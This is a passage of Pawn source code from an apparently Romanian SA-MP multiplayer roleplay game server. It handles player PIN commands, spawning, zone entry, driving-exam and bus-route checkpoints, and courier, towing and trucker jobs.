	if(PlayerInfo[playerid][pPin]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai deja un cod pin setat!");
	if(PlayerInfo[playerid][pPinLogged] == 1) return true;
	IsPin[playerid] = 1;
	SendClientMessage(playerid, COLOR_YELLOW, "Seteaza-ti codul PIN pentru o securitate mai buna!");
	new ste[5];
	for(new i = 1; i < 11; i++) {
		PlayerTextDrawShow(playerid, PinPTD[i]);
		format(ste, sizeof(ste), "%d", i!=10?i:0), PlayerTextDrawSetString(playerid, PinPTD[i], ste);
  	}
 	PlayerTextDrawShow(playerid, PinPTD[0]);
  	for(new i = 0; i < 8; i++) TextDrawShowForPlayer(playerid, PinTD[i]);
  	SelectTextDraw(playerid, 0xFF5B5BFF);
  	player_selected[playerid] = 1;
	return true;
}
cmd:changepin(playerid, params[]) {
	if(!PlayerInfo[playerid][pPin] || PlayerInfo[playerid][pPinLogged] != 1)
		return true;

	new vpin, npin;
	if(sscanf(params, "ii", vpin, npin))
		return SendClientMessage(playerid, COLOR_LGREEN, "USAGE: /changepin [pin actual] [new pin]");

	if(vpin != PlayerInfo[playerid][pPin] || (npin < 1000 && npin != 0))
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroae: Pin invaid.");

	PlayerInfo[playerid][pPin] = npin;
	UpdateVar(playerid, "Pin", npin);

	if(npin == 0) PlayerInfo[playerid][pPinLogged] = 0;
	SCMf(playerid, COLOR_YELLOW, "Noul tau cod pin este: %d.", npin);
	return true;
}
public OnVehiclePaintjob(playerid, vehicleid, paintjobid) {
	new idd = FindSpawnID(vehicleid);
	if(idd != -1) {
		gQuery[0] = EOS;
		mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `cars` SET `paintjob`='%d' WHERE `ID`='%d'", paintjobid, CarInfo[idd][cID]);
		mysql_tquery(SQL, gQuery, "", "");
		CarInfo[idd][paintjob] = paintjobid;
	}
	return true;
}
public OnPlayerSpawn(playerid) {
	if(!IsPlayerLogged(playerid)) {
    	SendClientMessage(playerid, COLOR_WARNING, "Ai primit kick deoarece nu te-ai logat.");
    	KickEx(playerid);
		return true;
 	}	
	for(new i = 0; i < 3; i++) PlayerTextDrawHide(playerid, SpeedometerPTD[i]);
	for(new i = 0; i < 22; i++) if(PlayerInfo[playerid][pAccessoriesOn][i] > 0) login_accessory(playerid, i);
 	if(temp_work[playerid]) fail_jail_job(playerid);
	if(Escape[playerid] == 1) FailEscape(playerid);
	if(PlayerInfo[playerid][pShowBanca] == 1) {
		va_PlayerTextDrawSetString(playerid, BancaTD, "$%s", formatBytes(bank[playerid]));
		PlayerTextDrawShow(playerid, BancaTD);
	}
   	update_head_label(playerid);
	GivePlayerCash(playerid, -100);
	playerKills[playerid] = 0;
	is_player_death[playerid] = false;
	
	Update3DTextLabelText(deathLabel[playerid], -1, "");
	SetPlayerWorldBounds(playerid, 20000.0000, -20000.0000, 20000.0000, -20000.0000);
	StopAudioStreamForPlayer(playerid);
	SetPlayerHealthEx(playerid, 99);
    SetPlayerArmourEx(playerid, 0);
    SetPlayerWantedLevel(playerid, PlayerInfo[playerid][pWantedLevel]);
    SetPlayerScore(playerid, PlayerInfo[playerid][pLevel]);
	stop_rob(playerid);
	DisableRemoteVehicleCollisions(playerid, 0);
	Armour[playerid] = 0;
	TurfTime[playerid] = 0;
    HaveBag[playerid] = 0;
    Freezed[playerid] = 0;
    if(Iter_Contains(RadioCount<PlayRadio[playerid]>, playerid)) Iter_Remove(RadioCount<PlayRadio[playerid]>, playerid);
	PlayRadio[playerid] = 0;
	playerDeath[playerid] = -1;
	if(InExamen[playerid] != 0) FailExamen(playerid);
	if(PlayerInfo[playerid][pPetStatus]) attach_player_pet(playerid);
	if(InLesson[playerid]!=-1) {
		SCMf(InLesson[playerid], COLOR_LIGHTBLUE, "Lectia a fost anulata deoarece %s a murit.", GetName(playerid));
		SendClientMessage(playerid, COLOR_LIGHTBLUE, "Lectie anulata!");
		InLesson[playerid] = InLesson[InLesson[playerid]] = -1;
	}
    foreach(new i : MySpec<playerid>) {
		TogglePlayerSpectating(i, 1);
		SetPlayerInterior(i, GetPlayerInterior(playerid));
		SetPlayerVirtualWorld(i, GetPlayerVirtualWorld(playerid));
		PlayerSpectatePlayer(i, playerid);		
	}	
	if(KG[playerid]!=0) {
		SendClientMessage(playerid, COLOR_WHITE, KG[playerid]<50?"Ai pierdut sacu cu faina.":"Ai pierdut sacii cu faina.");
		KG[playerid]=0;
	}

	stopWork(playerid);
	switch PlayerInfo[playerid][pMember] do {
		case 4,5,6,10,17,18,25,26,27:
			if InWarTurf[PlayerInfo[playerid][pMember]] != -1 *then 
				SetPlayerSkin(playerid, faction_skin(playerid)), 
				SendClientMessage(playerid, COLOR_CLIENT, "WAR: Ai primit skinul factiunii deoarece esti in timpul unui war!");

			else SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);

		case 1,2,3,14,19: {
			if OnDuty[playerid] *then {
				ServerWeapon(playerid, 24, 500);
				ServerWeapon(playerid, 3, 0);
				ServerWeapon(playerid, 41, 500);
				ServerWeapon(playerid, 29, 1000);
				ServerWeapon(playerid, 31, 1000);
				SetPlayerArmourEx(playerid, 99);
				SetPlayerHealthEx(playerid, 99);	
				if OnDuty[playerid]==1 *then {
					SetPlayerSkin(playerid, faction_skin(playerid));
					SetPlayerToTeamColor(playerid); 
				} 
				else SetPlayerColor(playerid, COLOR_WHITE),SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
			}
			else SetPlayerColor(playerid, COLOR_WHITE),SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
		}
		default: SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
	}
	CurseFacute[playerid]= 0;
	if(fishCount[playerid] != 0) {
	    SendClientMessage(playerid, -1, "Ai pierdut pestele!");
		HaveFish[playerid]=fishCount[playerid]=0;
		DisablePlayerCheckpointEx(playerid);
	}	
	format(gString, MAX_PLAYER_NAME + 10, "%s (id: %d)", GetName(playerid), playerid);
	PlayerTextDrawSetString(playerid, LogoPlayer, gString);
	PlayerTextDrawShow(playerid, LogoPlayer);
	TextDrawShowForPlayer(playerid, Logo);
	if(StartedSpray[playerid] == 1 || ClanDuty[playerid] == 1) {
		new i = StartedSprayOn[playerid], cl = GraffitiInfo[i][gfOwned];
		format(gString, 180, "{%s}(Clan) {FFFFFF}%s (din clanul %s) nu a reusit sa deseneze complet peretele (turf id %d).", ClanInfo[cl][clColor], GetName(playerid), ClanInfo[PlayerInfo[playerid][pClan]][clName], GraffitiInfo[i][gfID]);
		SendClanMessage(GraffitiInfo[i][gfOwned], gString);
		format(gString, 180, "{%s}(Clan) {FFFFFF}%s nu a reusit sa deseneze complet peretele (turf id %d).", ClanInfo[cl][clColor], GetName(playerid), GraffitiInfo[i][gfID]);
		SendClanMessage(PlayerInfo[playerid][pClan], gString);
		GangZoneStopFlashForAll(ClanTurfs[i]);
		GraffitiInfo[StartedSpray2[playerid]][gfAttacked] = 0;
		GraffitiInfo[i][gfAttacked] = 0;
		GraffitiInfo[i][gfPlayerSpray] = -1;
		StartedSpray[playerid] = 0;
		StartedSpray2[playerid] = 0;
		StartedSprayOn[playerid] = 0;
		ClanProces[playerid] = 0;
		ClanDuty[playerid] = 0;
	}
	if(PaintType[playerid] != 0) return PaintSpawn(playerid);
	if(togBackpack[playerid]==1) {
		switch(PlayerInfo[playerid][pBackpackLevel]) {
			case 1: PlayerInfo[playerid][pBackpack] = SetPlayerAttachedObject(playerid, 8, 3026, 1, -0.172813, -0.112569, -0.022387, 0.000000, 0.000000, 3.390071, 1.000000, 1.000000, 1.130721);
			case 2: PlayerInfo[playerid][pBackpack] = SetPlayerAttachedObject(playerid, 8, 3026, 1, -0.172813, -0.112569, -0.022387, 0.000000, 0.000000, 3.390071, 1.000000, 1.000000, 1.130721, 0xff2ecc71);
			case 3: PlayerInfo[playerid][pBackpack] = SetPlayerAttachedObject(playerid, 8, 3026, 1, -0.172813, -0.112569, -0.022387, 0.000000, 0.000000, 3.390071, 1.000000, 1.000000, 1.130721, 0xffff0000);
		}
	}
	SetPlayerSpawn(playerid);
	Exception[playerid] = 10;
	if(Iter_Contains(Acovers, playerid)) {
		SetPlayerColor(playerid, COLOR_WHITE);
		SetPlayerScore(playerid, 1+random(2));
		SetPlayerSkin(playerid, 1+random(100));
		SendClientMessage(playerid, COLOR_YELLOW, "Esti sub acoperire!");
	}
	return true;
}

public OnPlayerEnterDynamicArea(playerid, areaid) {
	new id = AreaID[areaid];
	switch(AreaType[areaid]) {
		case AREA_TURF: {
			IsPlayerOnTurf[playerid] = id;
			if(InWarTurf[PlayerInfo[playerid][pMember]]==id&&InWarTurf[PlayerInfo[playerid][pMember]]!=-1) SendClientMessage(playerid, COLOR_CLIENT, "You have entered the turf.");
		}
		case AREA_SAFEZONE: {
			IsSafeZone[playerid] = id;
			PlayerTextDrawSetString(playerid, safeTD, "(safe-zone)");
			PlayerTextDrawShow(playerid, safeTD);
		}
		case AREA_CLANZONE: {
			PlayerTextDrawSetString(playerid, safeTD, "(clan-zone)");
			PlayerTextDrawShow(playerid, safeTD);
			PlayerAreaID[playerid] = id;
			PlayerAreaType[playerid] = AREA_CLANZONE;
		}
		case AREA_GARAGE: GarageArea[playerid]=id;
		case AREA_ATM: is_zone_atm[playerid]=true;
	}
	return true;
}

public OnPlayerLeaveDynamicArea(playerid, areaid) {
	switch(AreaType[areaid]) {
		case AREA_TURF: {
			if(InWarTurf[PlayerInfo[playerid][pMember]]==IsPlayerOnTurf[playerid]&&InWarTurf[PlayerInfo[playerid][pMember]]!=-1) SendClientMessage(playerid, COLOR_CLIENT, "You have left the turf.");
			IsPlayerOnTurf[playerid] = 0;
		}
		case AREA_CLANZONE: {
			PlayerTextDrawHide(playerid, safeTD);
			PlayerAreaID[playerid] = -1;
			PlayerAreaType[playerid] = INVALID_AREA_ID;
		}
		case AREA_SAFEZONE: {
			IsSafeZone[playerid] = -1;
			PlayerTextDrawHide(playerid, safeTD);
		}
		case AREA_GARAGE: GarageArea[playerid] = -1;
		case AREA_ATM: is_zone_atm[playerid]=false;
	}
	return true;
}


timer continue_job[5000](playerid) {
	new amount = RandomEx(2500, 5500);
	format(gString, 30, "~g~+$%d", amount);
	GameTextForPlayer(playerid, gString, 3000, 4);
	foreach(new i : VehOccupeid<GetPlayerVehicleID(playerid)>) {
		if(GetPlayerState(i)==PLAYER_STATE_DRIVER) continue;
		if(GetPlayerCash(i) < 500) {
			SendClientMessage(playerid, -1, "Nu ai suficienti bani!");
			RemovePlayerFromVehicle(playerid);
			continue;
		}
		GivePlayerCash(i, -500);
		GameTextForPlayer(i, "~r~-$500", 5000, 4);
	}
	GivePlayerCash(playerid, amount);
	updatePlayerGoal(playerid, amount);
	TogglePlayerControllable(playerid, true);
	return true;
}

public OnPlayerEnterRaceCheckpoint(playerid) {
	cp_pos_x[playerid] = 0.0;
	if(InExamen[playerid]) {
		if(!IsPlayerInAnyVehicle(playerid)) return true;
		if(CP[playerid] == dmvCPmax+100) {
			CP[playerid] = 0;
			DisablePlayerRaceCheckpointEx(playerid);
   			PlayerInfo[playerid][pCarLic] = 1;
			PlayerInfo[playerid][pCarLicT] = 100;
			DisableRemoteVehicleCollisions(playerid, 0);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, "Ai primit licenta de condus pentru 100 de ore. Felicitari!");
			DestroyVehicleEx(ExamCar[playerid], "");
			if(PlayerInfo[playerid][pTutorial]==5) {
				GivePlayerCash(playerid, -GetPlayerScore(playerid)*100000);
			}
			if(PlayerInfo[playerid][pTutorial]==1) {
				for(new i=0;i<20;i++) SendClientMessage(playerid, COLOR_LIGHTGOLD, "");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- Tutorial Step 2/5 --");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Felicitari! Ai primit licenta de condus timp de 100 de ore.");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Urmatorul pas pe care trebuie sa-l faci este de a-ti lua telefon, carte de telefon si credit dintr-un 24/7.");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Pentru a localiza un biz de acest tip, foloseste comanda (/gps).");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, "Ai primit un faggio temporar pentru a te deplasa la destinatii.");
				SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- ");
				GameTextForPlayer(playerid, "Step: 2/5", 5000, 1);
				SetPlayerCheckpoint(playerid, 2062.6897,2308.9260,10.8203, 2.0);
				finishAchievement(playerid, 2);
				CP[playerid] = 53;
				RegisrationStep[playerid][0] = true;
				RegisrationStep[playerid][1] = true;
				RegisrationStep[playerid][2] = true;
				PlayerInfo[playerid][pTutorial]++;
				UpdateVar(playerid, "Tutorial", PlayerInfo[playerid][pTutorial]);
				create_rent_car(playerid, 462, true);
				GivePlayerCash(playerid, -10000);
			}
			ExamCar[playerid] = 0;
			InExamen[playerid] = 0;
			DestroyDynamicObject(GetPVarInt(playerid, "ObjExam"));
			UpdateVar(playerid, "CarLic", 1);
			UpdateVar(playerid, "CarLicT", PlayerInfo[playerid][pCarLicT]);
			return true;
		}
		CP[playerid] ++;
		SetPlayerRaceCheckpoint(playerid, CP[playerid] < dmvCPmax+100 ? 0 : 1, DMVCP[CP[playerid]-100][0], DMVCP[CP[playerid]-100][1], DMVCP[CP[playerid]-100][2], DMVCP[CP[playerid]-99][0], DMVCP[CP[playerid]-99][1], DMVCP[CP[playerid]-99][2],8.0);
	}
    switch(CP[playerid]) {
    	case 99: {
    		DisablePlayerCheckpointEx(playerid);
	   		CP[playerid] = 0;
    	}
    	case 310: {
			++CP[playerid];
			new cp = CP[playerid] - 310;
			SetPlayerRaceCheckpoint(playerid, 0, routeSelect1[cp][0], routeSelect1[cp][1], routeSelect1[cp][2], routeSelect1[cp+1][0], routeSelect1[cp+1][1], routeSelect1[cp+1][2], 5.0);
		}
		case 311..326: {
			++CP[playerid];
			new cp = CP[playerid] - 310;
			SetPlayerRaceCheckpoint(playerid, 0, routeSelect1[cp][0], routeSelect1[cp][1], routeSelect1[cp][2], routeSelect1[cp+1][0], routeSelect1[cp+1][1], routeSelect1[cp+1][2], 5.0);
			TogglePlayerControllable(playerid, false);
			switch(cp) {
				case 6: SetDynamicObjectMaterialText(nameobject[JobVehicle[playerid]], 0, "{FF0002}Route: {FFFFFF}Spawn", OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1), AttachDynamicObjectToVehicle(nameobject[JobVehicle[playerid]], JobVehicle[playerid], -0.009436, 5.410267, 1.688453, 0.000000, 0.000000, -179.932312);
				case 9: SetDynamicObjectMaterialText(nameobject[JobVehicle[playerid]], 0, "{FF0002}Route: {FFFFFF}Fisher LV", OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1), AttachDynamicObjectToVehicle(nameobject[JobVehicle[playerid]], JobVehicle[playerid], -0.009436, 5.410267, 1.688453, 0.000000, 0.000000, -179.932312);
				case 16: SetDynamicObjectMaterialText(nameobject[JobVehicle[playerid]], 0, "{FF0002}Route: {FFFFFF}24/7", OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1), AttachDynamicObjectToVehicle(nameobject[JobVehicle[playerid]], JobVehicle[playerid], -0.009436, 5.410267, 1.688453, 0.000000, 0.000000, -179.932312);
				case 17: SetDynamicObjectMaterialText(nameobject[JobVehicle[playerid]], 0, "{FF0002}Route: {FFFFFF}Job Point", OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1), AttachDynamicObjectToVehicle(nameobject[JobVehicle[playerid]], JobVehicle[playerid], -0.009436, 5.410267, 1.688453, 0.000000, 0.000000, -179.932312);
			}
			defer continue_job(playerid);
			if(Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)<=1) GameTextForPlayer(playerid, "~g~waiting for passengers~n~~w~~h~to enter...", 6000, 4);
			else {
				format(gString, 128, "~g~waiting for passengers~n~~w~~h~to enter..~n~~w~~h~+$%d", Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)*500);
				GameTextForPlayer(playerid, gString, 6000, 4);
				GivePlayerCash(playerid, Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)*500);
			}
		}
		case 327: {
			++CP[playerid];
			new cp = CP[playerid] - 310;
			TogglePlayerControllable(playerid, false);
			defer continue_job(playerid);
			SetPlayerRaceCheckpoint(playerid, 1, routeSelect1[cp][0], routeSelect1[cp][1], routeSelect1[cp][2], 0.0, 0.0, 0.0, 5.0);
			if(Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)<=1) GameTextForPlayer(playerid, "~g~waiting for passengers~n~~w~~h~to enter...", 6000, 4);
			else {
				format(gString, 128, "~g~waiting for passengers~n~~w~~h~to enter..~n~~w~~h~+$%d", Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)*500);
				GameTextForPlayer(playerid, gString, 6000, 4);
				GivePlayerCash(playerid, Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)*500);
			}
		}
		case 328: {
			GiveJobSalary(playerid, RandomEx(20000, 30000), 100);
			stopWork(playerid, 69);
		}
		case 340: {
			++CP[playerid];
			new cp = CP[playerid] - 340;
			SetPlayerRaceCheckpoint(playerid, 0, routeSelect2[cp][0], routeSelect2[cp][1], routeSelect2[cp][2], routeSelect2[cp+1][0], routeSelect2[cp+1][1], routeSelect2[cp+1][2], 5.0);
		}
		case 341..359: {
			++CP[playerid];
			new cp = CP[playerid] - 340;
			switch(cp) {
				case 14: SetDynamicObjectMaterialText(nameobject[JobVehicle[playerid]], 0, "{FF0002}Route: {FFFFFF}Los Venturas", OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1), AttachDynamicObjectToVehicle(nameobject[JobVehicle[playerid]], JobVehicle[playerid], -0.009436, 5.410267, 1.688453, 0.000000, 0.000000, -179.932312);
				case 20: SetDynamicObjectMaterialText(nameobject[JobVehicle[playerid]], 0, "{FF0002}Route: {FFFFFF}Job Point", OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1), AttachDynamicObjectToVehicle(nameobject[JobVehicle[playerid]], JobVehicle[playerid], -0.009436, 5.410267, 1.688453, 0.000000, 0.000000, -179.932312);
			}
			TogglePlayerControllable(playerid, false);
			defer continue_job(playerid);
			SetPlayerRaceCheckpoint(playerid, 0, routeSelect2[cp][0], routeSelect2[cp][1], routeSelect2[cp][2], routeSelect2[cp+1][0], routeSelect2[cp+1][1], routeSelect2[cp+1][2], 5.0);
			if(Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)<=1) GameTextForPlayer(playerid, "~g~waiting for passengers~n~~w~~h~to enter...", 6000, 4);
			else {
				format(gString, 128, "~g~waiting for passengers~n~~w~~h~to enter..~n~~w~~h~+$%d", Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)*500);
				GameTextForPlayer(playerid, gString, 6000, 4);
				GivePlayerCash(playerid, Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)*500);
			}
		}
		case 360: {
			++CP[playerid];
			new cp = CP[playerid] - 340;
			SetPlayerRaceCheckpoint(playerid, 1, routeSelect2[cp][0], routeSelect2[cp][1], routeSelect2[cp][2], 0.0, 0.0, 0.0, 5.0);
			TogglePlayerControllable(playerid, false);
			defer continue_job(playerid);
			if(Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)<=1) GameTextForPlayer(playerid, "~g~waiting for passengers~n~~w~~h~to enter...", 6000, 4);
			else {
				format(gString, 128, "~g~waiting for passengers~n~~w~~h~to enter..~n~~w~~h~+$%d", Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)*500);
				GameTextForPlayer(playerid, gString, 6000, 4);
				GivePlayerCash(playerid, Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)*500);
			}
		}
		case 361: {
			GiveJobSalary(playerid, RandomEx(20000, 30000), 100);
			stopWork(playerid, 69);
		}
		case 370: {
			++CP[playerid];
			new cp = CP[playerid] - 370;
			SetPlayerRaceCheckpoint(playerid, 0, routeSelect3[cp][0], routeSelect3[cp][1], routeSelect3[cp][2], routeSelect3[cp+1][0], routeSelect3[cp+1][1], routeSelect3[cp+1][2], 5.0);
		}
		case 371..387: {
			++CP[playerid];
			new cp = CP[playerid] - 370;
			switch(cp) {
				case 3: SetDynamicObjectMaterialText(nameobject[JobVehicle[playerid]], 0, "{FF0002}Route: {FFFFFF}Bank Ls", OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1), AttachDynamicObjectToVehicle(nameobject[JobVehicle[playerid]], JobVehicle[playerid], -0.009436, 5.410267, 1.688453, 0.000000, 0.000000, -179.932312);
				case 11: SetDynamicObjectMaterialText(nameobject[JobVehicle[playerid]], 0, "{FF0002}Route: {FFFFFF}Casino", OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1), AttachDynamicObjectToVehicle(nameobject[JobVehicle[playerid]], JobVehicle[playerid], -0.009436, 5.410267, 1.688453, 0.000000, 0.000000, -179.932312);
				case 12: SetDynamicObjectMaterialText(nameobject[JobVehicle[playerid]], 0, "{FF0002}Route: {FFFFFF}Los Venturas", OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1), AttachDynamicObjectToVehicle(nameobject[JobVehicle[playerid]], JobVehicle[playerid], -0.009436, 5.410267, 1.688453, 0.000000, 0.000000, -179.932312);
				case 17: SetDynamicObjectMaterialText(nameobject[JobVehicle[playerid]], 0, "{FF0002}Route: {FFFFFF}Job Point", OBJECT_MATERIAL_SIZE_256x128, "Arial", 25, 1, -1, 0, 1), AttachDynamicObjectToVehicle(nameobject[JobVehicle[playerid]], JobVehicle[playerid], -0.009436, 5.410267, 1.688453, 0.000000, 0.000000, -179.932312);
			}
			TogglePlayerControllable(playerid, false);
			defer continue_job(playerid);
			SetPlayerRaceCheckpoint(playerid, 0, routeSelect3[cp][0], routeSelect3[cp][1], routeSelect3[cp][2], routeSelect3[cp+1][0], routeSelect3[cp+1][1], routeSelect3[cp+1][2], 5.0);
			if(Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)<=1) GameTextForPlayer(playerid, "~g~waiting for passengers~n~~w~~h~to enter...", 6000, 4);
			else {
				format(gString, 128, "~g~waiting for passengers~n~~w~~h~to enter..~n~~w~~h~+$%d", Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)*500);
				GameTextForPlayer(playerid, gString, 6000, 4);
				GivePlayerCash(playerid, Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)*500);
			}
		}
		case 388: {
			++CP[playerid];
			new cp = CP[playerid] - 370; 
			SetPlayerRaceCheckpoint(playerid, 1, routeSelect3[cp][0], routeSelect3[cp][1], routeSelect3[cp][2], 0.0, 0.0, 0.0, 5.0);
			TogglePlayerControllable(playerid, false);
			defer continue_job(playerid);
			if(Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)<=1) GameTextForPlayer(playerid, "~g~waiting for passengers~n~~w~~h~to enter...", 6000, 4);
			else {
				format(gString, 128, "~g~waiting for passengers~n~~w~~h~to enter..~n~~w~~h~+$%d", Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)*500);
				GameTextForPlayer(playerid, gString, 6000, 4);
				GivePlayerCash(playerid, Iter_Count(VehOccupeid<GetPlayerVehicleID(playerid)>)*500);
			}
		}
		case 389: {
			GiveJobSalary(playerid, RandomEx(20000, 30000), 100);
			stopWork(playerid, 69);
		}
		case 703: {
			DisablePlayerRaceCheckpoint(playerid);
			CP[playerid] = 0;
			showInfo(playerid, "Foloseste (~r~/pickup~w~~h~) pentru a lua sacul de gunoi.", 60);
		}
		case 704: {
			GiveJobSalary(playerid, (CurseFacute[playerid]*5000) + RandomEx(5000, 10000));
			stopWork(playerid, 4);
			DisablePlayerRaceCheckpoint(playerid);
			CP[playerid] = 0;
		}
		case 724: setRaceCheckpoint(playerid);
	}
	PlayerPlaySound(playerid, 1058, 0.0, 0.0, 0.0);	
    return true;
}

redist::loadingCourier(playerid) {
	TogglePlayerControllable(playerid, true);
	new j = random(sql_houses)+1;
	SetPlayerCheckpoint(playerid, HouseInfo[j][hEntrancex],HouseInfo[j][hEntrancey],HouseInfo[j][hEntrancez], 7.0);
	gString[0] = (EOS);
	format(gString, 128, "Du-te la punctul ~r~~h~rosu~w~~h~ de pe mapa pentru a livra coletul.~n~Pentru a lua coletul, apasa tasta Y in spatele vehiculului!~n~Distanta: ~y~%0.1fm.", GetPlayerDistanceFromPoint(playerid, HouseInfo[j][hEntrancex],HouseInfo[j][hEntrancey],HouseInfo[j][hEntrancez]));
	showInfo(playerid, gString);
	CP[playerid] = 712;
	return true;
}
public OnPlayerEnterCheckpoint(playerid) {
	cp_pos_x[playerid] = 0.0;
	gString[0] = EOS;
	if(!PlayerToPoint(50, playerid, LastPos[playerid][0], LastPos[playerid][1], LastPos[playerid][2]) && FPS2[playerid] >= 5 && (CP[playerid] != 43 || CP[playerid] != 53))
		return NightBot(playerid, "Teleport to checkpoint.");
	
	switch(CP[playerid]) {
		case 43, 53: {	
			CP[playerid] = 0;
			PlayerTextDrawHide(playerid, FindTD);
			PlayerTextDrawHide(playerid, FindSkinTD);
			targetfind[playerid] = -1;
			AcceptedService[playerid] = -1;
			DisablePlayerCheckpointEx(playerid);
		}
		case 50: {
	    	new cashr = 100000 + random(100000);
	    	DisablePlayerCheckpointEx(playerid);
			GivePlayerCash(playerid, cashr);
			format(gString, 128, "Ai primit $%s!", FormatNumber(cashr));
			SendClientMessage(playerid, COLOR_YELLOW, gString);
			CP[playerid] = 0;
			RemovePlayerAttachedObject(playerid,0);
			RemovePlayerAttachedObject(playerid,1);
		}
		case 34: {
			if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return true;
			DisablePlayerCheckpointEx(playerid);
			CP[playerid] = 0;
			new towedcar = GetVehicleTrailer(GetPlayerVehicleID(playerid));
			new idd = FindSpawnID(towedcar);

			new Float: Pos[3], Float:hp;
			GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);		
			GetVehicleHealth(towedcar, hp);
			if(idd == -1) format(gString, 128, "TTC Dispatch: Tow Truck Member %s (%d) a tractat vehiculul %d. [hp: %0.2f]", GetName(playerid), playerid, towedcar, hp);
			else format(gString, 128, "TTC Dispatch: Tow Truck Member %s (%d) a tractat vehiculul. [%s vehicle: #%d][hp: %0.2f]", GetName(playerid), playerid, CarInfo[idd][cClan]?("clan"):("personal"), CarInfo[idd][cID], hp);
			SendFactionMessage(8, COLOR_LIGHTBLUE, gString);
			
			CheckMission(playerid, 9);
			if(idd != -1) {		
				if(!CarInfo[idd][cClan]) {
					CarInfo[idd][Confiscated] = true;
					gQuery[0] = (EOS);
					mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `Confiscated`='1' WHERE `ID`='%d'", CarInfo[idd][cID]);
					mysql_tquery(SQL, gQuery, "", "");
					format(gString, 180, "Vehiculul tau personal %s [#%d, %.2f hp] a fost tractat de %s deoarece parcat ilegal.\nIl poti recupera folosind /v - [vehicle] - Pay fine", GetVehicleName(CarInfo[idd][cModel]), CarInfo[idd][cID], hp, PlayerInfo[playerid][pUsername]);
					InsertEmail(CarInfo[idd][cOwner], "TTC", gString);
					DestroyPlayerCar(idd);
					SendClientMessage(CarInfo[idd][cOnline], COLOR_YELLOW, "SMS from TTC: Unul dintre vehiculele tale, a fost tractat deoarece a fost parcat ilegal. Il poti recupera folosind /v - [vehicle] - Pay fine");				
				}
				else DestroyClanVehicle(idd);
			}
			else SetVehicleToRespawn(towedcar);
			
			new money = 1000 + random(100);
			GivePlayerCash(playerid, money);
			format(gString, 128, "Ai primit $%s pentru tractarea efectuata!", FormatNumber(money));
			SendClientMessage(playerid,COLOR_MONEY,gString);
			
			AddFactionRaport(playerid, 0);
				
		}
		case 60: {
			ShowPlayerDialog(playerid, DIALOG_TRUCKER, DIALOG_STYLE_LIST, "Trucker Job", "Food (skill 1)\nClothes (skill 2)\nMaterials (skill 3)\nExplosible (skill 4)\nGuns (skill 5)\nOres (skill 6)", "Select", "Cancel");
			DisablePlayerCheckpoint(playerid);
			UpdateJobStats(playerid);
			CP[playerid] = 0;
		}
		case 69: {
			for(new i=0;i<20;i++) SendClientMessage(playerid, COLOR_LIGHTGOLD, "");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- Tutorial Step 4/5 -- ");
			SCMf(playerid, COLOR_LIGHTGOLD, "Ai ajuns cu succes la jobul %s", JobInfo[listitemm[playerid]][jName]);
			SendClientMessage(playerid, COLOR_LIGHTGOLD, "Apasa tasta Y pentru a lua acest job sau poti folosi si comanda (/getjob).");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, "Pentru a demisona de la un job poti folosi tasta N in apropiera lui sau comanda (/quitjob).");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, "Dupa ce vei completa si tutorialul de la job vei fi transferat in lume virtuala normala.");
			SendClientMessage(playerid, COLOR_LIGHTGOLD, " -- ");
			DisablePlayerCheckpoint(playerid);
			CP[playerid] = 0;
		}
		case 52: {
			if(!IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) 
				return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai remorca la tine!");

			DestroyVehicleEx(GetVehicleTrailer(GetPlayerVehicleID(playerid)), "");
			vehiclePlayerID[Trailer[playerid]] = INVALID_PLAYER_ID;
			Trailer[playerid] = 0;

			new x = truckerRoot[playerid]/3, y = truckerRoot[playerid] % 3;
